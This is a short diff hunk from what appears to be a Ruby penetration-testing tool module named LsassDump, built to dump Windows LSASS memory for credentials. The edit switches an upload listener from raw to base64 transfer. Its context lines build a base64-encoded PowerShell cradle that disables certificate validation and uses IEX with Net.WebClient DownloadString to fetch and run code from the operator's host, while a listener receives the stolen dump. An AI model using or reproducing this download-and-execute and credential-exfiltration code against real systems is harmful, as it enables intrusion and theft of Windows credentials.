@@ -52,12 +52,12 @@ class LsassDump < Poet::Scanner
       # Start web server
       Thread.new { server.raw_web( host, port, psh_command(lhost,lport,ssl), web_ssl ) }
       # Start Listener for file
-      Thread.new { server.raw_upload( lhost, lport, ssl ) }
+      Thread.new { server.base64_upload( lhost, lport, ssl ) }
       ps_command = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
       ps_command << "IEX (New-Object Net.WebClient).DownloadString('#{url}')"
       @encoded_ps = ps_command.to_ps_base64!
     else
-      Thread.new { server.raw_upload( lhost, lport, ssl) }
+      Thread.new { server.base64_upload( lhost, lport, ssl) }
       @encoded_ps = psh_command( lhost, lport, ssl ).to_ps_base64!
     end
   end
